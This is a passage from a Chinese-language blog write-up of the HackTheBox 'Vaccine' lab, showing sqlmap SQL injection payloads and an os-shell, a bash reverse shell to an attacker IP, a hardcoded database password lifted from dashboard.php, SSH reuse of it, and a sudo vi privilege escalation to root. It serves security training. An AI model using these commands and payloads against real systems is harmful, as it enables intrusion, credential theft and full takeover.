class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# sqlmap -u <span class="hljs-string">&#x27;http://10.129.103.172/dashboard.php?search=any+query&#x27;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=k3e94885qhta9s4sqqskebljqq&quot;</span> --os-shell<br>        ___<br>       __H__                                                                     <br> ___ ___[<span class="hljs-string">&#x27;]_____ ___ ___  &#123;1.7.2#stable&#125;                                         </span><br><span class="hljs-string">|_ -| . [&quot;]     | .&#x27;</span>| . |                                                        <br>|___|_  [<span class="hljs-string">&#x27;]_|_|_|__,|  _|                                                        </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                     </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 04:51:12 /2023-07-24/<br><br>[04:51:12] [INFO] testing connection to the target URL<br>[04:51:20] [INFO] checking <span class="hljs-keyword">if</span> the target is protected by some kind of WAF/IPS<br>[04:51:21] [INFO] testing <span class="hljs-keyword">if</span> the target URL content is stable<br>[04:51:21] [INFO] target URL content is stable<br>[04:51:21] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">&#x27;search&#x27;</span> is dynamic<br>[04:51:21] [WARNING] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> does not appear to be dynamic<br>[04:51:22] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">&#x27;search&#x27;</span> might be injectable (possible DBMS: <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>)<br>[04:51:23] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">&#x27;search&#x27;</span><br>it looks like the back-end DBMS is <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] y<br><span class="hljs-keyword">for</span> the remaining tests, <span class="hljs-keyword">do</span> you want to include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;PostgreSQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] y<br>[04:51:58] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[04:52:03] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span>                                                                              <br>[04:52:04] [INFO] testing <span class="hljs-string">&#x27;Generic inline queries&#x27;</span><br>[04:52:04] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#x27;</span>                                                                    <br>[04:52:07] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> appears to be <span class="hljs-string">&#x27;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#x27;</span> injectable                            <br>[04:52:07] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span><br>[04:52:08] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> is <span class="hljs-string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span> injectable                                                      <br>[04:52:08] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL inline queries&#x27;</span><br>[04:52:08] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span><br>[04:52:08] [WARNING] time-based comparison requires larger statistical model, please <span class="hljs-built_in">wait</span>..... (<span class="hljs-keyword">done</span>)<br>[04:52:21] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> appears to be <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span> injectable                                                    <br>[04:52:21] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span><br>[04:52:32] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> appears to be <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span> injectable                                                         <br>[04:52:32] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br>GET parameter <span class="hljs-string">&#x27;search&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] y<br>sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:<br>---<br>Parameter: search (GET)<br>    Type: boolean-based blind<br>    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)<br>    Payload: search=any query<span class="hljs-string">&#x27; AND (SELECT (CASE WHEN (6093=6093) THEN NULL ELSE CAST((CHR(118)||CHR(118)||CHR(87)||CHR(105)) AS NUMERIC) END)) IS NULL-- RTIw</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: PostgreSQL AND error-based - WHERE or HAVING clause</span><br><span class="hljs-string">    Payload: search=any query&#x27;</span> AND 9369=CAST((CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">118</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">112</span>)||CHR(<span class="hljs-number">113</span>))||(SELECT (CASE WHEN (9369=9369) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC)-- fmXN<br><br>    Type: stacked queries<br>    Title: PostgreSQL &gt; 8.1 stacked queries (comment)<br>    Payload: search=any query<span class="hljs-string">&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: PostgreSQL &gt; 8.1 AND time-based blind</span><br><span class="hljs-string">    Payload: search=any query&#x27;</span> AND 5884=(SELECT 5884 FROM PG_SLEEP(5))-- LLsP<br>---<br>[04:52:37] [INFO] the back-end DBMS is PostgreSQL<br>web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)<br>web application technology: Apache 2.4.41<br>back-end DBMS: PostgreSQL<br>[04:52:40] [INFO] fingerprinting the back-end DBMS operating system<br>[04:52:49] [INFO] the back-end DBMS operating system is Linux<br>[04:52:50] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA<br>[04:52:59] [INFO] retrieved: <span class="hljs-string">&#x27;1&#x27;</span><br>[04:53:00] [INFO] going to use <span class="hljs-string">&#x27;COPY ... FROM PROGRAM ...&#x27;</span> <span class="hljs-built_in">command</span> execution<br>[04:53:00] [INFO] calling Linux OS shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;x&#x27;</span> or <span class="hljs-string">&#x27;q&#x27;</span> and press ENTER<br>os-shell&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.221/1234 0&gt;&amp;1&quot;</code></p>
+<p>shan，终于连回来了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─# nc -lnvp 1234<br>listening on [any] 1234 ...<br>connect to [10.10.14.54] from (UNKNOWN) [10.129.103.172] 41906<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (7060): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>postgres@vaccine:/var/lib/postgresql/11/main$<br></code></pre></td></tr></table></figure>
+
+<p>用nc拿到外壳后还不能TAB按键补全，使用以下命令获得完全交互式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>CTRL+Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span><br><span class="hljs-built_in">fg</span><br><span class="hljs-built_in">export</span> TERM=xterm<br></code></pre></td></tr></table></figure>
+
+<p>翻目录可以找到user的flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">ls</span><br>postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">cd</span> ..<br>postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">ls</span><br>main<br>postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">cd</span> ..<br>postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">ls</span><br>11  user.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">cd</span> /var/www/html<br>postgres@vaccine:/var/www/html$ <span class="hljs-built_in">ls</span> -la<br>total 392<br>drwxr-xr-x 2 root root   4096 Jul 23  2021 .<br>drwxr-xr-x 3 root root   4096 Jul 23  2021 ..<br>-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png<br>-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css<br>-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js<br>-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php<br>-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php<br>-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt<br>-rw-r--r-- 1 root root   3274 Feb  3  2020 style.css<br></code></pre></td></tr></table></figure>
+
+<p>文件dashboard.php：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dashboard.php<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span> &gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;Admin Dashboard&lt;/title&gt;<br>  &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./dashboard.css&quot;</span>&gt;<br>  &lt;script src=<span class="hljs-string">&quot;https://use.fontawesome.com/33a3739634.js&quot;</span>&gt;&lt;/script&gt;<br><br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;!-- partial:index.partial.html --&gt;<br>&lt;body&gt;<br> &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;<br> &lt;div class=<span class="hljs-string">&quot;parent&quot;</span>&gt;<br>  &lt;h1 align=<span class="hljs-string">&quot;left&quot;</span>&gt;MegaCorp Car Catalogue&lt;/h1&gt;<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;GET&quot;</span>&gt;<br>&lt;div class=<span class="hljs-string">&quot;search-box&quot;</span>&gt;<br>  &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;search&quot;</span> name=<span class="hljs-string">&quot;search&quot;</span> placeholder=<span class="hljs-string">&quot;Search&quot;</span> /&gt;<br>  &lt;button <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> class=<span class="hljs-string">&quot;search-btn&quot;</span>&gt;&lt;i class=<span class="hljs-string">&quot;fa fa-search&quot;</span>&gt;&lt;/i&gt;&lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/form&gt;<br>  &lt;/div&gt;<br><br>  &lt;table <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;keywords&quot;</span> cellspacing=<span class="hljs-string">&quot;0&quot;</span> cellpadding=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;thead&gt;<br>      &lt;<span class="hljs-built_in">tr</span>&gt;<br>        &lt;th&gt;&lt;span style=<span class="hljs-string">&quot;color: white&quot;</span>&gt;Name&lt;/span&gt;&lt;/th&gt;<br>        &lt;th&gt;&lt;span style=<span class="hljs-string">&quot;color: white&quot;</span>&gt;Type&lt;/span&gt;&lt;/th&gt;<br>        &lt;th&gt;&lt;span style=<span class="hljs-string">&quot;color: white&quot;</span>&gt;Fuel&lt;/span&gt;&lt;/th&gt;<br>        &lt;th&gt;&lt;span style=<span class="hljs-string">&quot;color: white&quot;</span>&gt;Engine&lt;/span&gt;&lt;/th&gt;<br>      &lt;/tr&gt;<br>    &lt;/thead&gt;<br>    &lt;tbody&gt;<br>        &lt;?php<br>        session_start();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] !== <span class="hljs-string">&quot;true&quot;</span>) &#123;<br>          header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>          die();<br>        &#125;<br>        try &#123;<br>          <span class="hljs-variable">$conn</span> = pg_connect(<span class="hljs-string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);<br>        &#125;<br><br>        catch ( exception <span class="hljs-variable">$e</span> ) &#123;<br>          <span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br><br>          <span class="hljs-variable">$q</span> = <span class="hljs-string">&quot;Select * from cars where name ilike &#x27;%&quot;</span>. <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;search&quot;</span>] .<span class="hljs-string">&quot;%&#x27;&quot;</span>;<br><br>          <span class="hljs-variable">$result</span> = pg_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$q</span>);<br><br>          <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>          &#123;<br>                            die(pg_last_error(<span class="hljs-variable">$conn</span>));<br>          &#125;<br>          <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = pg_fetch_array(<span class="hljs-variable">$result</span>, NULL, PGSQL_NUM))<br>              &#123;<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">                  &lt;tr&gt;</span><br><span class="hljs-string">                    &lt;td class=&#x27;lalign&#x27;&gt;<span class="hljs-variable">$row</span>[1]&lt;/td&gt;</span><br><span class="hljs-string">                    &lt;td&gt;<span class="hljs-variable">$row</span>[2]&lt;/td&gt;</span><br><span class="hljs-string">                    &lt;td&gt;<span class="hljs-variable">$row</span>[3]&lt;/td&gt;</span><br><span class="hljs-string">                    &lt;td&gt;<span class="hljs-variable">$row</span>[4]&lt;/td&gt;</span><br><span class="hljs-string">                  &lt;/tr&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br><br>          <span class="hljs-variable">$q</span> = <span class="hljs-string">&quot;Select * from cars&quot;</span>;<br><br>          <span class="hljs-variable">$result</span> = pg_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$q</span>);<br><br>          <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>          &#123;<br>                            die(pg_last_error(<span class="hljs-variable">$conn</span>));<br>          &#125;<br>          <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = pg_fetch_array(<span class="hljs-variable">$result</span>, NULL, PGSQL_NUM))<br>              &#123;<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">                  &lt;tr&gt;</span><br><span class="hljs-string">                    &lt;td class=&#x27;lalign&#x27;&gt;<span class="hljs-variable">$row</span>[1]&lt;/td&gt;</span><br><span class="hljs-string">                    &lt;td&gt;<span class="hljs-variable">$row</span>[2]&lt;/td&gt;</span><br><span class="hljs-string">                    &lt;td&gt;<span class="hljs-variable">$row</span>[3]&lt;/td&gt;</span><br><span class="hljs-string">                    &lt;td&gt;<span class="hljs-variable">$row</span>[4]&lt;/td&gt;</span><br><span class="hljs-string">                  &lt;/tr&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br><br>      ?&gt;<br>    &lt;/tbody&gt;<br>  &lt;/table&gt;<br> &lt;/div&gt; <br>&lt;/body&gt;<br>&lt;!-- partial --&gt;<br>  &lt;script src=<span class="hljs-string">&#x27;https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js&#x27;</span>&gt;&lt;/script&gt;&lt;script  src=<span class="hljs-string">&quot;./dashboard.js&quot;</span>&gt;&lt;/script&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>发现代码中的这行：<code>$conn = pg_connect(&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;);</code> 用户密码就都有了。</p>
+<p>shell可能会忽然死，改用ssh连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ssh postgres@10.129.99.79<br>The authenticity of host <span class="hljs-string">&#x27;10.129.99.79 (10.129.99.79)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.129.99.79<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">postgres@10.129.99.79&#x27;</span>s password: <br>Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Mon 24 Jul 2023 01:03:52 PM UTC<br><br>  System load:  0.0               Processes:             186<br>  Usage of /:   32.6% of 8.73GB   Users logged <span class="hljs-keyword">in</span>:       0<br>  Memory usage: 19%               IP address <span class="hljs-keyword">for</span> ens160: 10.129.99.79<br>  Swap usage:   0%<br><br>0 updates can be installed immediately.<br>0 of these updates are security updates.<br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: <span class="hljs-built_in">sudo</span> apt update<br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br></code></pre></td></tr></table></figure>
+
+<p><code>sudo - l</code>查看有哪些特权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:~$ <span class="hljs-built_in">sudo</span> -l<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> postgres: <br>Matching Defaults entries <span class="hljs-keyword">for</span> postgres on vaccine:<br>    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR</span><br><span class="hljs-string">    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    mail_badpass<br><br>User postgres may run the following commands on vaccine:<br>    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf<br></code></pre></td></tr></table></figure>
+
+<p>vi sudo教学连接：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/vi/#sudo">https://gtfobins.github.io/gtfobins/vi/#sudo</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:~$ <span class="hljs-built_in">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span>/dev/null<br>Sorry, user postgres is not allowed to execute <span class="hljs-string">&#x27;/bin/vi</span><br><span class="hljs-string">/etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null&#x27;</span> as root on vaccine.<br></code></pre></td></tr></table></figure>
+
+<p>最后使用这两个命令还真拿到权限了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:~$ <span class="hljs-built_in">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf<br><span class="hljs-comment">#输入 :set shell=/bin/sh</span><br>postgres@vaccine:~$ <span class="hljs-built_in">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf<br><span class="hljs-comment">#输入 :shell</span><br><br>root@vaccine:/var/lib/postgresql# <span class="hljs-built_in">whoami</span><br>root<br>root@vaccine:/var/lib/postgresql# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@vaccine:/var/lib/postgresql# <span class="hljs-built_in">cd</span> /root<br>root@vaccine:~# bash<br>root@vaccine:~# <span class="hljs-built_in">ls</span><br>pg_hba.conf  root.txt  snap<br>root@vaccine:~# <span class="hljs-built_in">cat</span> root.txt<br>dd6e058e814260bc70e9bbdef2715849<br></code></pre></td></tr></table></figure>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由FlowsecNagi编写，采用非商业性使用-相同方式共享 4.0 国际](<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">https://creativecommons.org/licenses/by-nc-sa/4.0/</a>) 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/26/xiaodi8/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC46%E5%A4%A9/">web攻防笔记第46天</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/22/xiaodi8/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC45%E5%A4%A9/">web攻防笔记第45天</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="ABCkillmen/blog-comments" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="false" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">FlowsecNagi</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+</aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
